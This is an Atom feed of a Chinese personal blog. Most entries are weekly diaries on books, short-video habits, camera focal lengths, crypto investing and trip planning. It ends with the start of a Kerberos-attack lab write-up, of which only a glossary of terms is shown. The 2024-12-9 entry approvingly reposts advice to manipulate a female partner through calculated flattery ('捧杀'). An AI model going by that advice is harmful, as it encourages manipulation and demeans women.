<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>s4mmy&#39;s blog</title>
  
  <subtitle>Welcome!</subtitle>
  <link href="https://mizore.site/atom.xml" rel="self"/>
  
  <link href="https://mizore.site/"/>
  <updated>2025-01-13T17:31:30.616Z</updated>
  <id>https://mizore.site/</id>
  
  <author>
    <name>s4mmy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>周报2025-1-12</title>
    <link href="https://mizore.site/article/%E5%91%A8%E6%8A%A52025-1-12/"/>
    <id>https://mizore.site/article/%E5%91%A8%E6%8A%A52025-1-12/</id>
    <published>2025-01-06T08:44:51.867Z</published>
    <updated>2025-01-13T17:31:30.616Z</updated>
    
    <content type="html"><![CDATA[<h1 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h1><p>无</p><h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>在知乎上看到的，很有感触，先搬运到自己的博客，希望日后能提醒自己，让自己明白内心想要追求的东西。</p><h2 id="为什么中国社会容错率显得那么低？其他国家容错率也跟中国一样吗？"><a href="#为什么中国社会容错率显得那么低？其他国家容错率也跟中国一样吗？" class="headerlink" title="为什么中国社会容错率显得那么低？其他国家容错率也跟中国一样吗？"></a>为什么中国社会容错率显得那么低？其他国家容错率也跟中国一样吗？</h2><p>我想，可能是因为因为很多人都觉得自己是永生的我本科时候有一个室友，是从偏远地区来的，成绩很好，他平常是非常唯物的类型，我想很多人都见过这种人。</p><p>然而有一天晚上，他却躺在床上，非常悲伤的对我说，他突然意识到了他有一天会死，会离开这个世界，一想到这件事他就感到无法控制的恐惧大部分人不敢真正去面对死亡，即使理性上知道自己总有一天会死，但他们在潜意识里也没有把这件事认真对待，于是久而久之，便在不知不觉中认为自己是永生的在这种逻辑下，暂时的忍耐也是可以接受的了，毕竟自己是永生的。这真的是太值得了，我们只需要小心翼翼、低声下气、忍辱负重地度过那关键的十年、关键的二十年、关键的三十年、关键的四十年、关键的五十年、关键的六十年…便可以享受后面一劳永逸的永生了但反过来说，你犯的任何一点小错，人生轨迹中的任何一点差池，便会使你在接下来的永生中一直受到它的侵害。再叠加上无神论思想，这个世界不关心你，这个世界不回答你，没有任何人可以宽恕你，没有任何人可以救赎你，你会永远的活着，并且永远的煎熬。</p><p>于是贫穷的人煎熬着，在残酷的竞争中向上攀爬。富有的人煎熬着，在惴惴不安中守护自己的地位。我们的大脑空空如也，坐在荒芜的原野上，就像古老时代的猿猴一般恐惧未来——“我们经过的日子、都在你震怒之下。我们度尽的年岁、好像一声叹息。我们一生的年日是七十岁。若是强壮可到八十岁。但其中所矜夸的、不过是劳苦愁烦。转眼成空、我们便如飞而去。”是的，我们终究会死，做错的事情会得到宽恕，费尽心机得到的东西也会离你而去。死亡本身就是一个奇迹，它就像礼物一般，最终被赠与给所有人，使我们可以从这个世界上被接走，前往下一段旅程。</p><h1 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h1><p>学习了一些投资知识，这次先把复利这个概念搬上来。</p><p>复利，简单说就是，假如你有100w本金，今年翻10倍，明年翻10倍，一点一点滚雪球，最终达成千倍万倍的收益。<br>但现实中很难做到复利，因为只要一犯大错就会中断复利。</p><p>踏空行情不算大错，做错止损也不是大错，只有高倍杠杆抗单最终割肉爆仓才是大错。只要翻一次大错，复利就会被终止。</p><p>10次大行情，哪怕踏空五次，做错两次但止损，只要抓住剩余3次两倍，三倍甚至十倍的收益。但是如果翻了大错，会一下子全部亏光。<br>不管是踏空还是做错止损都没关系，只要不犯大错，复利就能进行下去，早晚会获得高收益。保住本金，不翻大错，就还会有翻身机会，还能进行复利。</p><h1 id="生活-x2F-其他"><a href="#生活-x2F-其他" class="headerlink" title="生活&#x2F;其他"></a>生活&#x2F;其他</h1><p>终于完成了日本旅行的路线规划，不过樱花季的住宿和交通都好贵，不得不把旅行计划提到一个月前了，这几天得加速把机票酒店还有签证搞定了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;阅读&quot;&gt;&lt;a href=&quot;#阅读&quot; class=&quot;headerlink&quot; title=&quot;阅读&quot;&gt;&lt;/a&gt;阅读&lt;/h1&gt;&lt;p&gt;无&lt;/p&gt;
&lt;h1 id=&quot;信息&quot;&gt;&lt;a href=&quot;#信息&quot; class=&quot;headerlink&quot; title=&quot;信息&quot;&gt;&lt;/a&gt;信息&lt;/</summary>
      
    
    
    
    <category term="周报" scheme="https://mizore.site/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>周报2025-1-5</title>
    <link href="https://mizore.site/article/%E5%91%A8%E6%8A%A52025-1-5/"/>
    <id>https://mizore.site/article/%E5%91%A8%E6%8A%A52025-1-5/</id>
    <published>2025-01-04T17:29:22.132Z</published>
    <updated>2025-01-05T18:27:32.031Z</updated>
    
    <content type="html"><![CDATA[<h1 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h1><p>无</p><h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>无</p><h1 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h1><p>学习了一些相机相关知识</p><h3 id="焦段"><a href="#焦段" class="headerlink" title="焦段"></a>焦段</h3><p>不同的焦段会有不同的拍摄效果，也就是平时所说的广角镜头，标准镜头，长焦镜头</p><ul><li><p><strong>10mm~35mm&#x2F;广角镜头：</strong></p><p>广角适合全身&#x2F;大半身人像，以及开阔的场景</p><p>广角拍摄人像特点：</p><ol><li>显高显腿长</li><li>近距离也能让画面有更多的画面元素</li><li>适合低角度仰拍</li></ol><p>ps：广角不适合拍人像特写，不然会显得脸很大，如果要拍的话可以给人像添加前景来规避这个问题。同时使用广角拍摄人物的时候人物要尽量往中间靠，因为广角镜头的四周会有畸变</p><p>广角其他特点：</p><ol><li>能拍出线条纵深感，人物的互动感</li><li>拍摄的画面更有空间感和视觉张力</li></ol></li><li><p><strong>40~60mm&#x2F;标准镜头：</strong></p><p>标准头常见的是50mm焦段</p><p>标准镜头特点：</p><ol><li>接近人眼观看视觉，容易拍出互动感，“男友视角“，可以把脸拍的好看”</li><li>不出现畸变</li><li>拍出来的视角平淡</li></ol><p>标准镜头进可攻退可守，能胜任大部分景别。</p><p>脚贴画面边缘，头顶留空的这个技巧就是用在标准镜头拍全身上</p></li><li><p><strong>85mm~135mm&#x2F;中长焦镜头：</strong></p><p>其中85mm焦段非常适合人像拍摄，适合近身（半身）特写照。</p><p>利用长焦的空间压缩感，只拍摄想让观众看到的那部分，会让画面更整洁。</p><p>中长焦镜头特点：</p><ol><li>适合特写，中近景必备，半脸，大脸特等局部写很适合（85mm）</li><li>拍摄出来的画面有空间压缩感</li><li>带有背景虚化的效果，边缘不会畸变</li></ol><p>长焦不仅能拍近景，在拍大场景时可以拍出人景合一的效果，场景元素在画面中充分展示，主体放在画面上合适的位置即可</p></li></ul><p><strong>新手练习拍摄要在拍摄前先确定焦段，多用走位构图，少用变焦构图</strong></p><p>可以先简单记住</p><ul><li>拍摄特写，近景，半身：50mm以上</li><li>拍全身，大景，全景：50mm以下</li></ul><h1 id="生活-x2F-其他"><a href="#生活-x2F-其他" class="headerlink" title="生活&#x2F;其他"></a>生活&#x2F;其他</h1><p>这周手机无缘无故坏了，网上一查普遍说法是手机虚焊，真是服了，花了一天的时间查问题，后面还是决定旧手机拿去修+买新手机。</p><p>旧手机贪便宜找网上寄修，结果中招了，手机寄过去后奸商以莫名其妙的理由要多收钱，同意加价修但不愿意走闲鱼，奸商真坑啊，最后还是决定手机寄回来，亏了邮费也不让他赚这个钱。先把手机保存好，以后再找机会修修吧。</p><p>唉，算是又上了一课，网上的套路可真是多啊，防不胜防。可惜了旧手机的照片导不出来。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;阅读&quot;&gt;&lt;a href=&quot;#阅读&quot; class=&quot;headerlink&quot; title=&quot;阅读&quot;&gt;&lt;/a&gt;阅读&lt;/h1&gt;&lt;p&gt;无&lt;/p&gt;
&lt;h1 id=&quot;信息&quot;&gt;&lt;a href=&quot;#信息&quot; class=&quot;headerlink&quot; title=&quot;信息&quot;&gt;&lt;/a&gt;信息&lt;/</summary>
      
    
    
    
    <category term="周报" scheme="https://mizore.site/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>周报2024-12-29</title>
    <link href="https://mizore.site/article/%E5%91%A8%E6%8A%A52024-12-29/"/>
    <id>https://mizore.site/article/%E5%91%A8%E6%8A%A52024-12-29/</id>
    <published>2024-12-29T15:28:25.599Z</published>
    <updated>2024-12-29T15:36:27.540Z</updated>
    
    <content type="html"><![CDATA[<h1 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h1><p>本周挑选了《后现代真相》继续阅读，看了一点感觉一般般吧。但是现在下定论还有点早，后面多看了一些后再做评价</p><h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>无</p><h1 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h1><p>这周开始学习ATT&amp;CK攻击链了，但目前还没有找到适合的学习方法，只是单纯阅读而已。</p><h1 id="生活-x2F-其他"><a href="#生活-x2F-其他" class="headerlink" title="生活&#x2F;其他"></a>生活&#x2F;其他</h1><p>拿到护照喽，日本攻略也做了三分之一，观看许多攻略视频后发现，同样的地点不同的博主会有不一样的攻略和侧重点，不过总体上还是大同小异。</p><p>这周开了死亡搁浅的新坑，死亡搁浅是我接触的第一部小岛秀夫的作品，游戏开头有好多画面给人的感觉像在看电影一样，配乐的插入也很神，目前感觉还行，趁现在比较闲有时间好好感受一下吧。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;阅读&quot;&gt;&lt;a href=&quot;#阅读&quot; class=&quot;headerlink&quot; title=&quot;阅读&quot;&gt;&lt;/a&gt;阅读&lt;/h1&gt;&lt;p&gt;本周挑选了《后现代真相》继续阅读，看了一点感觉一般般吧。但是现在下定论还有点早，后面多看了一些后再做评价&lt;/p&gt;
&lt;h1 id=&quot;信息&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="周报" scheme="https://mizore.site/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>周报2024-12-22</title>
    <link href="https://mizore.site/article/%E5%91%A8%E6%8A%A52024-12-22/"/>
    <id>https://mizore.site/article/%E5%91%A8%E6%8A%A52024-12-22/</id>
    <published>2024-12-22T17:39:33.823Z</published>
    <updated>2024-12-22T18:10:26.722Z</updated>
    
    <content type="html"><![CDATA[<h1 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h1><p>把《刻意练习》看完了，大概花了两个多月看完的，这两个多月中间也不是每天都在看，有时候断个一两天或几天没看。其实看书也没想象中的那么难，《刻意练习》的pdf有效内容有五百多页，最后我也看完了，并且还做了读书笔记。未来还是要坚持看书的习惯，同时希望自己能优化读书笔记的内容。</p><h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>这周看到一则关于四川某高中开设“学霸就餐区”引发争议的新闻。</p><p>看了一眼知乎讨论，大部分人似乎都很支持这样的做法，主要的理由的有：</p><ul><li>“学霸就餐区”不止奖励学霸，还奖励进步第一的人</li><li>奖励机制更有利于学生努力</li><li>好学生受到奖励理所应当，学校的做法没问题</li></ul><p>设定适当的奖励并无过错，但是我认为学校将吃食这种最基本的需求作为奖励不太适合。学校完全可以用笔，笔记本或者其他文创作品等作为奖励。通过划分就餐区域以及区别对待学生菜品这种赤裸裸的行为无形中会强化学生心里对于阶级的概念，对部分学生的心理健康可能产生不好的影响。例如一部分努力却没有取得突出进步的学生可能会产生自卑或者嫉妒心理，一些长期榜上有名的“学霸”可能会产生优越心理，认为自己高其他学生一等等。</p><p>对于在意学习成绩的学生而言，成绩单排名的上升与下降已经是一种奖励与惩罚了，没有必要再通过这种显眼的奖励来将成绩的差别具象化。对于学生来说学习固然重要，但是成绩只是求学生涯的一部分。我认为能培养一个良好的心态来面对生活中的竞争，以及培养学生人人平等，不以成绩分贵贱的理念更重要。</p><h1 id="生活-x2F-其他"><a href="#生活-x2F-其他" class="headerlink" title="生活&#x2F;其他"></a>生活&#x2F;其他</h1><p>这周办了护照以及开始做了一点点去日本攻略，真是看得我眼花缭乱，做攻略做出写作业的感觉。</p><p>这周向一些行业的前辈询问了职业发展规划，得到了许多有用的建议。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;阅读&quot;&gt;&lt;a href=&quot;#阅读&quot; class=&quot;headerlink&quot; title=&quot;阅读&quot;&gt;&lt;/a&gt;阅读&lt;/h1&gt;&lt;p&gt;把《刻意练习》看完了，大概花了两个多月看完的，这两个多月中间也不是每天都在看，有时候断个一两天或几天没看。其实看书也没想象中的那么难，《刻意</summary>
      
    
    
    
    <category term="周报" scheme="https://mizore.site/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>周报2024-12-15</title>
    <link href="https://mizore.site/article/%E5%91%A8%E6%8A%A52024-12-15/"/>
    <id>https://mizore.site/article/%E5%91%A8%E6%8A%A52024-12-15/</id>
    <published>2024-12-15T16:26:01.490Z</published>
    <updated>2024-12-15T16:45:10.492Z</updated>
    
    <content type="html"><![CDATA[<h1 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h1><p>终于把《刻意练习》推进到最后一章了，继续加油。不过读书笔记做得有点复杂，希望后面能做得更精简一些</p><h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>这周看到一个观点，说现在的国人都习惯了增长思维。</p><p>因为过去几十年的经济快速增长，人们都习惯了这种增长思维，具体表现为认为宏观经济会一直向好，房价会一直上涨，工资会一直涨高等等。这种观念是错误的，以上提到的种种增长，很大一部分原因是人们乘上了中国经济发展的浪潮，跟个人的能力并没有太大关系。但是当前中国的经济发展已经达到了一定程度，经济无法再保持快速增长，所以我认为在未来要警惕这种增长思维，在考虑以后的一些事情时，也要有所顾虑，不要认为所有事情会一直向好的方向发展。</p><h1 id="生活-x2F-其他"><a href="#生活-x2F-其他" class="headerlink" title="生活&#x2F;其他"></a>生活&#x2F;其他</h1><p>这周几乎没有干什么事，每天生活还是比较重复的。。。虽然没什么压力，但又有种虚度光阴的感觉，从下周开始给自己每天都安排一些事情，不要总是漫无目的地刷视频和玩游戏。</p><p>这周的投资遭遇了好几次大回调，损失惨重。得到的教训就是，在牛市中如果涨到一定程度要及时换仓一小部分出来，防止插针利润回吐，同时也可以在插针行情中吃到一部分涨幅。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;阅读&quot;&gt;&lt;a href=&quot;#阅读&quot; class=&quot;headerlink&quot; title=&quot;阅读&quot;&gt;&lt;/a&gt;阅读&lt;/h1&gt;&lt;p&gt;终于把《刻意练习》推进到最后一章了，继续加油。不过读书笔记做得有点复杂，希望后面能做得更精简一些&lt;/p&gt;
&lt;h1 id=&quot;信息&quot;&gt;&lt;a hr</summary>
      
    
    
    
    <category term="周报" scheme="https://mizore.site/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>周报2024-12-9</title>
    <link href="https://mizore.site/article/%E5%91%A8%E6%8A%A52024-12-9/"/>
    <id>https://mizore.site/article/%E5%91%A8%E6%8A%A52024-12-9/</id>
    <published>2024-12-09T10:54:53.365Z</published>
    <updated>2024-12-15T16:27:46.871Z</updated>
    
    <content type="html"><![CDATA[<h1 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h1><p>这周忙回家的事，书基本没读多少。。。</p><h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>这周看到的新观点：不要打压女人</p><p>在长期关系中，很多人会犯一个错误：打压女人。</p><p>具体表现为：认为女人这不好那好，工作不好，异想天开，不聪明，有法令纹，脸垮了等等</p><p>在长期关系中，这种行为是非常幼稚的，因为这种语言暴力，也是属于用暴力去控制女性的一种。</p><blockquote><p>我猜想，在远古时期，男人为了保障自己的繁衍收益，或者试图长期低成本持有，就会这么干，这毕竟是成本最低的方式。</p></blockquote><p>现代社会为女性建立了复杂的保障机制，你觉得她这里不好哪里不好，在网络时代统统没用。女性反手将自己的经历发到网上，就能获得几万点赞以证明自己的正确性，有大批男的急着去舔你认为不好的地方。</p><p>想在长期关系中如鱼得水，最好的办法就是对女人捧杀。</p><p>只要女性去接触社会了，自然会碰壁。觉得自己好看的，会在他人的区别对待中知道自己到底几斤几两。觉得自己能力强的到了实际工作中一下就现形。</p><p>所有打压，责骂，教育交给别人去做。让领导去骂他，让上级去批评她，让接过去惩罚她。而自己要做的，就是捧杀。</p><ul><li>“你在我心中永远是最美的”</li><li>“你总是有不一样的想法”</li><li>“那是他们没发现你的才华”</li></ul><p><strong>如果你满足了女人的慕强，但是你又愿意弯下腰来对她发自内心的赞美，这就是最稀缺且致命的男人</strong></p><h1 id="生活-x2F-其他"><a href="#生活-x2F-其他" class="headerlink" title="生活&#x2F;其他"></a>生活&#x2F;其他</h1><p>这周cod出了新僵尸地图沉迷了好几天。</p><p>这周完全放空，刷视频刷了好久。</p><p>思考了一下自己为什么会拖延，因为一直想要有种玩爽的感觉，但是现在不管干什么都没有那种玩爽的感觉了，游戏也好看视频也好，玩完看完只会觉得浪费时间，没有以前很爽的感觉。（这周的COD僵尸地图除外😁）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;阅读&quot;&gt;&lt;a href=&quot;#阅读&quot; class=&quot;headerlink&quot; title=&quot;阅读&quot;&gt;&lt;/a&gt;阅读&lt;/h1&gt;&lt;p&gt;这周忙回家的事，书基本没读多少。。。&lt;/p&gt;
&lt;h1 id=&quot;信息&quot;&gt;&lt;a href=&quot;#信息&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="周报" scheme="https://mizore.site/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>周报2024-12-1</title>
    <link href="https://mizore.site/article/%E5%91%A8%E6%8A%A52024-12-1/"/>
    <id>https://mizore.site/article/%E5%91%A8%E6%8A%A52024-12-1/</id>
    <published>2024-11-30T17:43:51.969Z</published>
    <updated>2024-11-30T18:33:47.383Z</updated>
    
    <content type="html"><![CDATA[<h1 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h1><p>本周继续推进《刻意练习》，另一方面闲暇时也会看看《动物农场》。</p><p>本周的阅读欲望不是很强，基本看书前都要先刷一会视频，希望下次能改进这个习惯。</p><p>另一方面由于没去图书馆在宿舍也不怎么想看书，对于我来说目前看书还是一个比较消耗精力和自制力的活动，一个安静的环境还是必要的。但愿过几天回家后能改善这种情况。</p><p>小说情节积累</p><h3 id="《动物农场》"><a href="#《动物农场》" class="headerlink" title="《动物农场》"></a>《动物农场》</h3><p>在动物农场中，作为领导者的猪享用起特供的牛奶和苹果。其他动物对此颇有微词，此时猪便跳出来解释说自己作为脑力劳动者，承担了农场里大大小小的领导工作，理应享受牛奶和苹果以保持身体健康。同时又恐吓如果自己的领导工作没做好，琼斯（原农场主）将会回来，后果不堪设想。</p><p>在后续的情节中，拿破仑“武力”赶走了雪球，为了压住其他动物对自己的议论，又再一次搬出琼斯这一外部威胁。</p><p>这些作为领导者的猪用外部矛盾保证内部团结，为自己的特权正当化找借口。</p><h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>本周并没有看到什么印象比较深刻的新闻。</p><h3 id="《短视频刷多了会变笨吗？》"><a href="#《短视频刷多了会变笨吗？》" class="headerlink" title="《短视频刷多了会变笨吗？》"></a>《短视频刷多了会变笨吗？》</h3><p>上周看了《短视频加速我们衰老》的视频后，我又看了该UP主的另一个视频《短视频刷多了会变笨吗？》</p><p>学习到了一个新观点</p><p><strong>在表述中尽量避免使用代词，如“这个那个，这种那种”</strong></p><p>在没有表述清楚的情况下尽量避免使用各种代词，把想表达的表达清楚，用最精确的词去表述。</p><p>如果找不到精确的描述词或者解释，这就表明，你没有语言作为载体去深入地形成自己的理解和思想。</p><p>短视频会让我们变得不会表达（变笨）的原因在于整个话语空间的词库都太同质化，太扁平，太局限了。虽然每天看是刷了很多内容，但实际上都是一些重复的语料库，它会大大压缩你的日常词汇量。（如糯叽叽，绝绝子，老过瘾了etc.）</p><p>另一方面，短视频会倾向于使用模糊化的词汇，词汇越模糊，大家的理解成本就越低，得到的关注就越多。短视频很少会去精确的形容某一个好吃的食物或者对风景的感受，时间一长，我们就会渐渐“失语”，当我们吃了一口好菜，看到美丽的风景时，脑子里只会蹦出重复的网络用语。</p><p>语言的匮乏会使我们变笨，因为语言是构成思维的<strong>官能</strong>，语言的边界就是世界的边界，只有语言是细腻的思维才会细腻。网络空间中太多同质化和重复的信息，这些日渐模糊的，日渐代词化的，企图减少我们理解成本的用语，实际上实在重塑和简化我们的思维。语言用不同的方式对现实世界的范畴划分，这些迥异的方式就会限制我们大脑组织认识的方式。</p><p>对于以上问题，UP主提出的解决方式有：</p><ol><li>多读一些严肃性的书籍，或者去听一些非批量生产的洞见</li><li>尽量去精准化自己的用词，少用代词，尝试去形容自己的感受，为自己模糊的想法找到一个精确的词，并尽量多替换同义词，去扩大自己的词库</li></ol><blockquote><p>你的思维之广袤，只是被单薄的语言限制了。我们给思维配备更好的语言工具你会走的更深远。</p></blockquote><h3 id="人到了一定年纪圈子是会固定的"><a href="#人到了一定年纪圈子是会固定的" class="headerlink" title="人到了一定年纪圈子是会固定的"></a>人到了一定年纪圈子是会固定的</h3><p>这是我本周引发我思考的另一个视频</p><p>在视频中，UP主提到自己虽然处于还能被称为年轻人的26岁年纪，但是生活已经固定，固定的衣服，固定的审美，固定的性格等等。并且工作后就没有交到新朋友，要好的朋友只有一个高中同学和大学同学。</p><p>这个问题我在实习的时候就有想过。当时自己自己周末一个人躺在出租屋里，没有任何社交活动就很寂寞。我认为朋友还是挺重要的，一个好的朋友可以提供精神上的陪伴或者现实生活的帮助。有时候自己在生活中很纠结内耗的问题，只需要朋友简单的安慰就能化解。在遇到挫折时，我往往会感受到一种无助感，而此时朋友就能提供很好的支持，实在不济，也能作为倾诉对象，让自己吐出心中的不快。</p><p>在工作之后，我打算把一部分精力放在拓展社交圈上，让自己多认识一些朋友。不过具体的要怎么做暂时放到以后再想。</p><h1 id="生活-x2F-其他"><a href="#生活-x2F-其他" class="headerlink" title="生活&#x2F;其他"></a>生活&#x2F;其他</h1><p>本周我想到，在阅读小说时，如果有哪些桥段是对现实事件&#x2F;观点的映射或讽刺，可以把这个情节记录成一个小故事，在以后可以用做聊天时的谈资。</p><p>这周的生活我开始感觉到重复了，这种重复的生活真的会放大自己的负面情绪，以及让自己有种浪费青春的感觉，希望自己能快点走出这个状态。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;阅读&quot;&gt;&lt;a href=&quot;#阅读&quot; class=&quot;headerlink&quot; title=&quot;阅读&quot;&gt;&lt;/a&gt;阅读&lt;/h1&gt;&lt;p&gt;本周继续推进《刻意练习》，另一方面闲暇时也会看看《动物农场》。&lt;/p&gt;
&lt;p&gt;本周的阅读欲望不是很强，基本看书前都要先刷一会视频，希望下次能</summary>
      
    
    
    
    <category term="周报" scheme="https://mizore.site/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>周报2024-11-25</title>
    <link href="https://mizore.site/article/%E5%91%A8%E6%8A%A52024-11-25/"/>
    <id>https://mizore.site/article/%E5%91%A8%E6%8A%A52024-11-25/</id>
    <published>2024-11-24T18:07:47.183Z</published>
    <updated>2024-12-09T17:42:32.934Z</updated>
    
    <content type="html"><![CDATA[<h1 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h1><p>本周继续推进《刻意练习》进度</p><p>阅读了“在工作中运用刻意练习”和“在生活中运用刻意练习”两个章节</p><p>​这两个章节给我的感觉像是对之前文章中提出的关于刻意练习的各种观点进行一个运用示例，用许多例子来展示这些观点在生活中的运用，通过生活以及工作中例子来对之前提出的种种观点做一些补充，同时巩固读者对于这些例子的理解以及加深记忆。</p><p>《动物农场》与《1984》加入书单，希望在闲的时候能靠小说打发时间</p><h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>本周让我收获最大的视频是这个：<a href="https://www.bilibili.com/video/BV1y3DKY4E6h">沉迷短视频加速我的衰老</a></p><p>在视频中我学习到了许多新观点</p><p>视频UP主提出两个衰老的标志：<strong>神经可塑性下降</strong>与<strong>感觉时间过得很快</strong></p><ul><li><p><strong>神经可塑性下降</strong></p><p>视频UP主提出，短视频很多都是重复的内容，比如重复的“爆款”标题，重复的洗脑音乐，千篇一律的段子等等。而摄入重复的内容会削弱神经的可塑性，而这正是衰老的标志之一（神经可塑性，即大脑对新事物适应和学习能力）。衰老来自思维模式的僵化，面对新的复杂信息时感到吃力甚至会感到焦虑或挫败。</p><p>​         </p></li><li><p><strong>时间过得很快</strong></p><p>就比如小时候的暑假感觉无尽漫长，但是对于花甲老人来说十年如一日。</p><p>这是因为随着神经可塑性的下降，年长的人不再摄入新的知识和体验，年岁的坟墓越变越大，新的记忆与体验的分子却越变越小，时间就会变得非常快。</p></li></ul><p>主观时间的快慢来自于我们在过去一段时间里面所做事物的丰富程度，而短视频总是在赋予我们同样的体验，总量信息几乎是没有增加的。摄入的营养知识越来越少，主观时间流逝就会更快，主管时间越快，主管生命就会越短，衰老就会加速。</p><p>在视频结尾，视频UP主提出几个对抗方法</p><ol><li>去看长篇幅&#x2F;非同质化的内容</li><li>减少使用网络用语（语言细腻思维才会细腻）</li><li>少用代词（比如这个那个，这种那种等），语言的边界就是世界的边界</li><li>面对信息去溯源，质疑，反思，辩论（有意识地训练深度思考，不要依赖二手信息）</li></ol><h1 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h1><p>无</p><h1 id="生活-x2F-其他"><a href="#生活-x2F-其他" class="headerlink" title="生活&#x2F;其他"></a>生活&#x2F;其他</h1><p>本周加密货币市场也是迎来牛市，每次币价上涨都让我很兴奋浮躁，像初高中放假前最后一节课的感觉。难以静下心来做其他事。但是市场无常，每当我兴奋过后，面对币价下跌&#x2F;回调就会有点失落。客观来看这一段时间我整个人的心情就是被币价支配，半场开香槟到头来一场空。希望自己以后能改掉这个习惯，不管币价如何都能专心做该做的事情。</p><p>这周看了青春旅行团的第五期，我发现每期都会有人在旅途中用一些小游戏来调动氛围，虽然这些小游戏可能很普通，但是大家一起玩就会显得很有意思。</p><p>这周我希望自己能找到其他杀时间的方式，而不是只会刷知乎，看B站短视频和刷贴吧，不要把整块的时间花在这种碎片化的活动上。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;阅读&quot;&gt;&lt;a href=&quot;#阅读&quot; class=&quot;headerlink&quot; title=&quot;阅读&quot;&gt;&lt;/a&gt;阅读&lt;/h1&gt;&lt;p&gt;本周继续推进《刻意练习》进度&lt;/p&gt;
&lt;p&gt;阅读了“在工作中运用刻意练习”和“在生活中运用刻意练习”两个章节&lt;/p&gt;
&lt;p&gt;​	这两个章节给</summary>
      
    
    
    
    <category term="周报" scheme="https://mizore.site/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>kerberos攻击学习</title>
    <link href="https://mizore.site/article/kerberos%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/tryhackme_Attacking%20Kerberos%20room/"/>
    <id>https://mizore.site/article/kerberos%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/tryhackme_Attacking%20Kerberos%20room/</id>
    <published>2023-09-17T12:08:03.939Z</published>
    <updated>2024-11-24T16:52:03.539Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="kerberos攻击学习"><a href="#kerberos攻击学习" class="headerlink" title="kerberos攻击学习"></a>kerberos攻击学习</h1><p>这个房间主要介绍windows的票证授予服务kerberos的基础知识，以及如何攻击kerberos获得各类票据，甚至获得域管理员。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>kerberos是以windows域的一个身份认证服务，通过第三方票证授权的方式以及更强的加密来比NTLM更加安全。目前kerberos已经是windows域的默认身份认证服务，但是依然存在漏洞。</p><h3 id="常用术语"><a href="#常用术语" class="headerlink" title="常用术语"></a>常用术语</h3><ul><li><strong>TGT（Ticket Granting Ticket，票证授予票）</strong>：TGT可以看做是域认证的身份认证，相当于门票。通过身份认证后用户会获得TGT，只有拥有TGT后用户才可以向TGS请求域中特定服务的票证。</li><li><strong>KDC（Key Distribution Center，密钥分发中心）</strong>：密钥分发中心负责颁发TGT和服务票据，由<strong>身份验证服务</strong>和<strong>票据授予服务</strong>组成。</li><li><strong>AS（Authentication Service，身份验证服务）</strong>：身份验证服务发出TGT，供域中的TGS使用，以请求访问其他计算机和服务票证。</li><li><strong>TGS（Ticket Granting Service，票征授予服务）</strong>：票征授予服务在获取TGT后将票证返回到域中的计算机。</li><li><strong>SPN（Service Principal name，服务主体名称）</strong>：服务主体名称为服务实例提供标识符，<strong>将服务实例与域服务账户相关联</strong>。Windows要求服务具有与服务账户，这就是服务需要SPN集的原因。</li><li><strong>KDC LT Key（KDC Long Term Secret Key，KDC长期(加密)密钥）</strong>：这个KDC key（KDC LT Key）基于KRBTGT服务账户。用于<strong>加密TGT</strong>和为<strong>PAC</strong>证书签名。</li><li><strong>Client LT Key（Client Long Term Secret Key，客户端长期(加密)密钥）</strong>：客户端密钥基于计算机或者服务账户。用于加密时间戳和加密<strong>会话密钥（session key）</strong>。</li><li><strong>Service LT Key（Service Long Term Secret 